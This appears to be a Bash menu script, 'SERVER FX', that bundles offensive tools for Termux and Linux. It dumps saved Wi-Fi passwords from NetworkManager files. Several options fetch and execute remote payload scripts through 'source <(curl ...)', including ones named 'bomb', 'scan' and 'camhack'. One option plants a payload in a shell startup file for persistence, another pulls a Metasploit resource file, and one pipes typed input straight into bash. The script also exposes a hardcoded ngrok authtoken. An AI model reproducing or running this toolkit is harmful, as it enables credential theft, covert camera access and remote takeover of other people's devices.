#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'

echo -e "
      ${IGreen}┌═══════════─┐		
      │▶${clear}${IYellow} SERVER FX${clear}${IGreen} │
      └─┬═════════─┘
  ┌─────┘
  ├──${IGreen} [${IYellow}1${clear}${IGreen}] ${Green}ngrok http
  ${IGreen}├── [${IYellow}2${clear}${IGreen}] ${Green}ngrok tcp
  ${IGreen}├── [${IYellow}3${clear}${IGreen}] ${Green}portmap tcp
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}mversion
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}clean
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}check
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}more
  ${IGreen}└─▶ [${IYellow}0${clear}${IGreen}] ${Green}exit"
echo  
echo -en "      ${Green}[${IGreen}ENTER HERE${clear}${Green}]${Green}${clear}${IGreen} ▶ ${clear} "
read stn
echo
case $stn in
#linux-wifi-pass
lwifipass)
sudo cat /etc/NetworkManager/system-connections/*|grep "^psk=\|^id=\|^type"|sed '0~3 a\\--+--+--+--+--+--+--+--+--+--+--+--+'|sed '1 i\--+--+--+--+--+--+--+--+--+--+--+--+' >.saved.wifi.pass
;;

more)
clear
echo -e "
      ${IGreen}┌═══════════─┐		
      │▶${clear}${IYellow} SERVER FX${clear}${IGreen} │
      └─┬═════════─┘
  ┌─────┘
  ├──${IGreen} [${IYellow}1${clear}${IGreen}] ${Green}lwifipass
  ${IGreen}├── [${IYellow}2${clear}${IGreen}] ${Green}linkgen
  ${IGreen}├── [${IYellow}3${clear}${IGreen}] ${Green}htmllink
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}apktool
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}scan
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}bashrc
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}remote
  ${IGreen}├── [${IYellow}2${clear}${IGreen}] ${Green}camhack
  ${IGreen}├── [${IYellow}3${clear}${IGreen}] ${Green}bomb
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}fixm
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}mversion
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}rc
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}html
  ${IGreen}├── [${IYellow}2${clear}${IGreen}] ${Green}ngrok tcp
  ${IGreen}├── [${IYellow}3${clear}${IGreen}] ${Green}portmap tcp
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}mversion
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}clean
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}check
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}color
  ${IGreen}└─▶ [${IYellow}0${clear}${IGreen}] ${Green}authtoken"
echo;;

linkgen)
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/linkgen.sh);;

htmllink)
echo -en "      ${Green}[${IGreen}Enter the file name \$PWD/file.txt/etc${clear}${Green}]${Green}${clear}${IGreen} ▶ ${clear} "
read dd
clear;cat $dd |awk '{print "<li> <a href=\""$1"\" target=\"_blank\">"$1"</a></li>"}' >index.html
echo -en "      ${Green}[${IGreen}Saved as index.html${clear}${Green}]${Green}${clear}${IGreen} ▶ ${clear} ";;


apktool)
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh) ;;

scan)
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/scan);;

bashrc)
if [[ -e $PREFIX/etc/bash.bashrc ]]
then
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Make the changes? [${Red}ctrl c to cancel${clear}${IYellow}]${clear}"
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Hit enter key to start: ${clear}"
read null
curl -L -o $PREFIX/etc/bash.bashrc https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/rc/bash.bashrc --progress-bar
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IGreen}Adding extra keys...${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IGreen}Please wait...${clear}"
sleep 3
curl -L -o $HOME/.termux/colors.properties https://raw.githubusercontent.com/efxtv/Kali-LInux-Terminal-In-Termux/main/colors.properties --progress-bar
sleep 3
curl -L -o $HOME/.termux/termux.properties https://raw.githubusercontent.com/efxtv/Kali-LInux-Terminal-In-Termux/main/termux.properties --progress-bar
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IGreen}Done...${clear}"
else
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You are not the termux user${clear}"
fi ;;

remote)
if [[ -e $HOME/.vf ]]
then
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}VPN port found... ${clear}"
vport=$(cat $HOME/.vf)
curl -s -S https://raw.githubusercontent.com/efxtv/Payloads/main/linux/payload.txt|head -1|sed "s#vpt#$vport#g" 
#Your payload
echo ' >$PREFIX/etc/profile.d/system.run.sh'
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your Link is here: ${clear}"
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Server Exploited... ${clear}"
else
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${Red}Failed to find VPN-Port ${clear}"
echo '$HOME/.vf'
fi ;;

camhack)
cd $HOME
if [[ -e $HOME/camhack/run.sh ]]
then
cd camhack
chmod +x *
bash run.sh
else
curl -L -o $HOME/camhack.zip https://github.com/efxtv/EFX-Tv-Bookmarks/blob/main/bin/camhack.zip?raw=true --progress-bar
unzip camhack.zip -d camhack > /dev/null 2>&1 &
rm camhack.zip > /dev/null 2>&1 &
cd camhack
chmod +x *
bash run.sh
fi ;;


bomb)
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/bomb.sh);;

fixm)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${Red}There is an update. ${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${Red}Please visit on our YT channel ${clear}"
sleep 1
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${Red}Check for the latest metasploit video. ${clear}"
sleep 1
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${Red}Link will be added here soon. ${clear}"
sleep 1
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${Red}Please watch the full video ${clear}";;

mversion)
ctermuxorlinux=$(which bash|grep -o termux)
if [ "$ctermuxorlinux" == "termux" ]; then
echo -e "\t${IGreen} ${clear} ${Green}Installing mversion in termux...${clear}"
sleep 3
curl -L -o $PWD/mversion https://raw.githubusercontent.com/efxtv/Metasploit-in-termux/main/Scripts/mversion -s;chmod +x mversion;mv mversion $PREFIX/bin/
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Mversion installed (mversion -help)${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Green}Installing mversion in Linux  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Green}Please wait...${clear}"
sleep 3
curl -L -o $PWD/mversion https://raw.githubusercontent.com/efxtv/Metasploit-in-termux/main/Scripts/mversion -s
sudo chmod +x mversion
sudo mv mversion /usr/bin/
fi ;;


color)
ctermuxorlinux=$(which bash|grep -o termux)
if [ "$ctermuxorlinux" == "termux" ]; then
echo -e "\t${IGreen} ${clear} ${Green}Installing color in termux...${clear}"
sleep 3
curl -L -o $PREFIX/bin/color https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/color -s;chmod +x $PREFIX/bin/color
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Color installed (color -h)${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Green}Installing Color in Linux  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Green}Please wait...${clear}"
sleep 3
echo -e "\t${IGreen}└──${clear} ${Green}Executing sudo chmod +x color${clear}"
curl -L -o $PWD/color https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/color -s
sudo chmod +x color
sudo mv color /usr/bin/
fi ;;

rc)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Generating RCfile in PWD...${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Please wait...${clear}"
sleep 2
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Generated...${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Edit command:${IGreen} nano export.rc ${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Exploit command:${IGreen} msfconsole -q -r export.rc... ${clear}"
curl -L -o $PWD/export.rc https://raw.githubusercontent.com/efxtv/Payloads/main/android/export.rc -s;;

html)
clear;ls -la |grep "^-"|awk '{print $NF}'|awk '{print "<b><a href=\""$1"\">"$NF"</a></b><br />"}'|awk '!/index.html/' >index.html
chmod a=r index.html;chmod u=rw index.html
echo -e "
${clear}[${Green}✔${clear}] ${Yellow}Local server scripts:${clear}
\t${IGreen}├──${clear}${Green} python -m SimpleHTTPServer 8000
\t${IGreen}├──${clear}${Green} python3 -m SimpleHTTPServer 8000
\t${IGreen}├──${clear}${Green} twistd -n web -p 8000 --path .
\t${IGreen}├──${clear}${Green} ruby -run -ehttpd . -p8000
\t${IGreen}├──${clear}${Green} php -S localhost:8000
\t${IGreen}├──${clear}${Green} live-server
\t${IGreen}└──${clear}${Green} command | ncat -v -lk -p 8080 ${clear}"
echo
echo -en "[${Green}✔${clear}] ${Green} Your personal server : ${clear}"
read host
echo -e "$host"|bash ;;

authtoken)
echo -e "${clear}[${Green}✔${clear}] ${Green}Copy paste:${IYellow} ************************************************* ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} ************************************************* ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} ************************************************* ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} ************************************************* ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} ************************************************* ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} ************************************************* ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1lNm1F0ELHXjToHhMOPlbNqLEWe_6RM7XzPnj4yec6AWHXCKL ${clear}"
echo -en "[${Green}✔${clear}] ${Green}Please enter your authtoken : ${clear}"
read autho
$HOME/ngrok authtoken $autho 1>/dev/null
echo -e "[${Green}✔${clear}] ${Green}Ngrok fixed... try again : ${clear}"
;;

1)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your pressed ngrok http..${clear}"
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/server-ngrok-http.sh);;
  
2)
echo -e "${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your pressed ntrok tcp..${clear}"
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/server-ngrok-tcp.sh);;
  
3)
echo -e "${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You pressed portmap tcp..${clear}"
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/portmap-tcp.sh);;

4)
echo -e "${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You pressed check..${clear}"
phpo()
{
cphp=$(which php|grep -o php)
if [ "$cphp" == "php" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}PHP is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}PHP is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

wgeto()
{
cphp=$(which wget|grep -o wget)
if [ "$cphp" == "wget" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Wget is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Wget is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

zipo()
{
czip=$(which zip|grep -o zip)
if [ "$czip" == "zip" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Zip is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Zip is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Checking for dependency..${clear}"
unzipo()
{
cunzip=$(which unzip|grep -o unzip)
if [ "$cunzip" == "unzip" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Unzip is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Unzip is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

curlo()
{
ccurl=$(which curl|grep -o curl)
if [ "$ccurl" == "curl" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Curl is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Curl is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}
jqo()
{
cjq=$(which jq|grep -o jq)
if [ "$cjq" == "jq" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Jq is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Jq is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

dnso()
{
cdnso=$(which host|grep -o host)
if [ "$cdnso" == "host" ]; then
echo -e "\t${IGreen}└──${clear} ${Green}DNSutils is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}DNSutils is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}pkg install dnsutils ${clear}"
exit
fi
}
phpo

wgeto

zipo

unzipo

curlo

jqo

dnso;;
#4 ends here
5)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You pressed clean..${clear}"
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Delete index.html and payloads? enter to confirm :${clear}"
read l
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Processing..${clear}"
sleep 3
pkill php
pkill ngrok
rm -rf index.html payload* shell*;;
0)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Thank you :)${clear}"
echo
;;
*)
  echo -e " $(tput setaf 2)[$(tput sgr0)$(tput setaf 1)x$(tput sgr0)$(tput setaf 2)]$(tput sgr0) ${Red}No no no !! Wrong input";;
esac
